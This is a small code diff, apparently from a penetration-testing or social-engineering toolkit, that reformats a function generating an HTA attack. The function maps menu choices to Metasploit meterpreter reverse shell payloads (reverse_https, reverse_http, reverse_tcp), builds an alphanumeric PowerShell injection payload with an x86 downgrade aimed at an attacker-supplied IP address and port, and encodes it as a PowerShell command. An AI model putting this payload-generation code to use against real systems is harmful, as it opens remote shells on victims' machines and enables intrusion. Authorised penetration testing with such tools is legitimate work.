@@ -18,20 +18,15 @@ def gen_hta_cool_stuff():
     selection = input("Enter the payload number [1-3]: ")
 
     # define the payloads
-    if selection == "":
-        selection = "1"
-    if selection == "1":
-        selection = "windows/meterpreter/reverse_https"
-    if selection == "2":
-        selection = "windows/meterpreter/reverse_http"
-    if selection == "3":
-        selection = "windows/meterpreter/reverse_tcp"
+    if selection == "":  selection = "1"
+    if selection == "1": selection = "windows/meterpreter/reverse_https"
+    if selection == "2": selection = "windows/meterpreter/reverse_http"
+    if selection == "3": selection = "windows/meterpreter/reverse_tcp"
 
     # generate powershell code
     print_status(
         "Generating powershell injection code and x86 downgrade attack...")
-    ps = generate_powershell_alphanumeric_payload(
-        selection, ipaddr, port, "x86")
+    ps = generate_powershell_alphanumeric_payload(selection, ipaddr, port, "x86")
     command = (powershell_encodedcommand(ps))
 
     # hta code here
